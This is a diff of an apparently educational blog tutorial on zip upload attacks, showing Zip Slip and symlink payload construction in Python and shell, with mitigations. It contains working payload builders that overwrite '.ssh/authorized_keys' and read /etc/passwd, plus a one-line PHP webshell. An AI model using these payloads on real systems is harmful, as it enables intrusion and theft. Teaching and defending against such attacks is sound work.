@@ -1,6 +1,6 @@
 ---
 title: Attack of the Zip
-excerpt: Diving into zip file upload attacks with examples.
+excerpt: Deep dive into zip file upload attacks and mitigations with examples.
 tags: 
   - tutorial
   - web
@@ -88,10 +88,14 @@ When unzipped by a vulnerable application, the filename will typically be append
 4. Profit! Run arbitrary commands.
 
 But for this to work, the container needs to be running `sshd` (or some program which handles SSH connections) and port 22 needs to be exposed.
+
+There are other ways to escalate ourselves to remote code execution (RCE). If the web server processes templates, then we can write a template which abuses template functions to run system commands. For example, if the web server was in PHP, we could upload a zip containing a webshell such as `<?php system($_GET["cmd"]); ?>`.
 {% endalert %}
 
 #### DIY: Build your own Zip Slip payload!
-The easiest way is to use the Python `zipfile` module:
+
+{% details "With Python", "open" %}
+The easiest way is to use Python's `zipfile` module:
 
 ```python
 import zipfile
@@ -100,9 +104,14 @@ with zipfile.ZipFile("evil-slip.zip", "w") as zip:
     zip.write("my-key.pub", "../.ssh/authorized_keys")
 ```
 
+This creates a new `evil-slip.zip` zip file, which contains the *contents* of our previously generated `my-key.pub`, and it's stored as `../.ssh/authorized_keys`.
+
 `zipfile` constructs the file in memory without creating temporary files. This removes the need to clean up temporary files.
 
-Another approach is to reverse the process, starting with files we want unzipped.
+{% enddetails %}
+
+{% details "With Shell Commands" %}
+Another approach is to use shell commands and reverse the process: starting with files we want unzipped.
 
 ```shell
 $ touch ../.ssh/authorized_keys
@@ -122,8 +131,9 @@ Archive:  evil-slip.zip
       575                     1 file
 ```
 
+{% enddetails %}
 
-#### Limitations
+#### Limitations of Zip Slip
 
 - On Windows, you may need backslashes `\` instead of forward slashes `/`. This ultimately depends on the unzipping application/library.
 - The app needs execute permissions on intermediate folders (to traverse across) and write permissions on the target folder.
@@ -153,7 +163,7 @@ evil-link-file.zip
 └── passwd.txt         -> /etc/passwd
 ```
 
-Upload and let the app unzip it. Our filesystem now resembles:
+Upload the zip to the playground and let the app unzip it. Our filesystem now resembles:
 
 ```text
 app/
@@ -161,9 +171,15 @@ app/
     └── passwd.txt     -> /etc/passwd
 ```
 
-If we can read files in `/app/uploads/`, then we can read `passwd.txt` and by extension, `/etc/passwd`. Then GG! We can use this method to read any file on the system (subject to certain constraints to be discussed later).
+If we can read files in `/app/uploads/`, then we can read `passwd.txt` and by extension, `/etc/passwd`.[^really-by-extension] Then GG! We can use this method to read any file on the system (subject to certain constraints to be discussed later).
 
-But... what if we *don't* have read access to `/app/uploads/`? What if say... we had read access to `/app/static/`, where static files (.html, .css, .js) are served from? We would need to write our symlink to *that* folder first before reading it. One way is to use Zip Slip. But what if the application blocks requests with `../`? is there an alternative way?
+[^really-by-extension]: Okay, I skipped some steps here, but didn't want to overcomplicate things. The long answer is: reading a symlink also depends on permissions of the {% abbr "source file", "the file linked by the symlink" %} and the {% abbr "source directory", "the directory containing the source file" %}. ***If*** we can read files in our upload directory **and** if we have sufficient permissions, then we can (potentially) have arbitrary read.
+
+But... what if we *don't* have read access to `/app/uploads/`?
+
+This is the case in our Docker playground. `/app/uploads/` is walled off... But! We can access files in `/app/static/`. This is the folder where static files (.html, .css, .js) are served from.
+
+We would need to write our symlink to *that* folder first before reading it. One way is to use Zip Slip. But what if the application blocks requests with `../`? Is there an alternative way?
 
 
 #### Arbitrary Write with Dir Symlinks
@@ -173,10 +189,10 @@ This is where things get fun. Let's slightly modify our zip by inserting a littl
 ```text
 evil-link-dir-file.zip
 └── dirlink/           -> /app/static/
-    └── passwd.html    -> /etc/passwd
+    └── passwd.txt     -> /etc/passwd
 ```
 
-Now our zip contains a symlink directory! When unzipped, the vulnerable application will create a symlink to `/app/static/`. Then inside that symlink, it creates *another* symlink, this time to `/etc/passwd`.
+Now our zip contains a symlink directory! When unzipped, the vulnerable application will first create a symlink to `/app/static/`. Then inside that symlink, it creates *another* symlink, this time to `/etc/passwd`.
 
 Let's see what our filesystem now looks like.
 
@@ -195,7 +211,8 @@ This method can also be used to write to `~/.ssh/authorized_keys` and apply the 
 
 #### DIY: Build your own Zip Symlink Payload!
 
-Again, we can use Python to generate zip symlink payloads. We'll need some extra massaging with `ZipInfo` though.
+{% details "With Python", "open" %}
+Like before, we can use Python to generate zip symlink payloads. We'll need some extra massaging with `ZipInfo` though.
 
 ```python
 # evil-link-file.zip
@@ -226,17 +243,27 @@ For a double symlink attack, we just create another entry for the directory.
    zip.writestr(info, "/etc/passwd")
 ```
 
-We can also do this manually with shell commands. (Make sure to use `-y`/`--symlinks` when zipping symlinks. Otherwise, you'd be adding your actual `/etc/passwd`!)
+{% enddetails %}
+
+{% details "With Shell Commands" %}
+Shell commands also work. (Make sure to use `-y`/`--symlinks` when zipping symlinks. Otherwise, you'd be adding your actual `/etc/passwd`!)
 
 ```sh
+# Create our (soft) links.
 ln -s /app/static/ dirlink
 ln -s /etc/passwd dirlink/passwd.txt
+# Zip the links.
 zip -y evil-link-dir-file dirlink dirlink/passwd.txt
 ```
 
-#### Limitations
+Note that this approach will leave leftover files to be cleaned up (or reused).
+{% enddetails %}
 
-- Permissions on Linux. To create a symlink, we need execute permissions in the source directory (where the linked file is located) and write/execute permissions in the target directory (where the symlink is created).[^ref-linuxlinkperm]
+#### Limitations of Zip Symlink Attacks
+
+- Permissions on Linux.
+  - To create a symlink, we need execute permissions in the source directory (where the linked file is located) and write/execute permissions in the target directory (where the symlink is created).[^ref-linuxlinkperm]
+  - Reading a symlink requires execute permissions in the source directory, and read permissions on the source file.
 - Permissions on [Windows](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-symbolic-links). By default, only Administrators have the privilege to create symbolic links. This setting can be changed by [editing the local group policy](https://superuser.com/a/105381) (typically for users) or by directly enabling `SeCreateSymbolicLinkPrivilege` (typically for processes).
 
 [^ref-linuxlinkperm]: Reference: [SO: Minimum Permissions Required to Create a Link to a File](https://stackoverflow.com/questions/40667014/linux-what-are-the-minimum-permissions-required-to-create-a-link-to-a-file)
@@ -321,16 +348,26 @@ Any service processing such files has potential to be vulnerable.
 
 ## Mitigations and Other Considerations
 
+{% image "https://csis-website-prod.s3.amazonaws.com/s3fs-public/publication/171212_cyber_Defense.jpg", "w-40 floatr1", "Credit: Cybrain/Adobe Stock" %}
+
+So much for the offensive side. How about the defensive aspect? What approaches can we take to secure our systems? Let's explore ways to mitigate zip attacks.
+
 ### Permissions
 In America, "all men are created equal". Not so in filesystems.
 
 Reading, writing, and linking files depends on permissions. Setting appropriate permissions for the process and limiting the scope of an application can go a long way in preventing attackers from snooping your secrets.
 
 {% alert "success" %}
-1. Avoid running the application as `root`. Instead, run it with a minimum privilege user.
+1. Avoid running the application as `root`. Instead, run it with a minimum privilege user. (Minimum meaning: enough permissions to get the job done, and only enabling risky permissions when needed.)
   
     In Docker, we can configure this with `chown` and [`USER`](https://docs.docker.com/engine/reference/builder/#user). (I intentionally left these out in the demo.)
+  
+2. Lock down sensitive/system files, only allowing access to privileged users.
+
+    Not always possible. The app still needs to—say—write logs, meaning log poisoning may still be possible.
 {% endalert %}
+
+See [Limitations of Zip Slip](#limitations-of-zip-slip) and [Limitations of Zip Symlink Attacks](#limitations-of-zip-symlink-attacks) for the permissions to manage.
 
 ### Checks
 On the development side: research and verify your edge cases! Some libraries ignore simple edge cases and fall prey to Zip Slip. Or they disregard symlinks, and fall prey to symlink attacks. Extra time may be needed to research edge cases and consider different scenarios, but hey, it makes for good Shift Left practice.
@@ -338,17 +375,17 @@ On the development side: research and verify your edge cases! Some libraries ign
 Here are a couple more recommendations:
 
 {% alert "success" %}
-2. Consider edge cases (OS? roles? users? filenames? encodings?) and add appropriate {% abbr "branches", "if-statements, guards, exception-handling, etc." %}.
+3. Proactively consider and research edge cases (OS? roles? users? filenames? encodings?) and add appropriate {% abbr "branches", "if-statements, guards, exception-handling, etc." %}.
 
     Here's a [*fix that came with Juce v6.1.5*](https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R438-R440) to prevent arbitrary write attacks:
 
     ```cpp
-    if (!targetFile.isAChildOf(targetDirectory))
+    if (!fileToUnzip.isAChildOf(directoryToUnzipTo))
       // Attack attempt detected: attempted write outside of unzip directory.
       return Result::fail("...");
     ```
 
-3. Adopt unit/integration testing to verify your code works as intended. Add test cases against unintended situations. (For example, Juce v6.1.5 also added a [test case against Zip Slip](https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R700).)
+4. Adopt unit/integration testing to verify your code works as intended. Add test cases against unintended situations. (For example, Juce v6.1.5 also added a [test case against Zip Slip](https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R700).)
  
 {% endalert %}
 
@@ -357,19 +394,23 @@ Here are a couple more recommendations:
 While we're on the topic of software development, having sensible defaults in libraries and application goes a long way.
 
 {% alert "success" %}
-4. Use defaults such as:
+5. Use defaults such as:
 
    - Don't follow symlink directories.
    - Don't overwrite files. You don't want your files wiped out, right?
 
-  It's a good idea to keep these defaults, unless you really need these features, and you're confident with the level of risk you're dealing with.
+    It's a good idea to keep these defaults, unless you really need these features, and you're confident with the level of risk you're dealing with.
 
 {% endalert %}
 
 
 ### Modern Antivirus
 
-Especially on Windows, which 
+Although zip bombs have targeted antivirus (AV) systems in the past, most [modern AV programs can detect zip bombs](https://www.microsoft.com/en-us/windows/learning-center/what-is-a-zip-bomb) by recognising patterns and signatures. This brings us to our last suggestion:
+
+{% alert "success" %}
+6. Upgrade your (antivirus) software. Daily updates to malware signatures ensure that your antivirus program stays equipped to detect and thwart emerging threats.
+{% endalert %}
 
 
 ## Further Reading / References
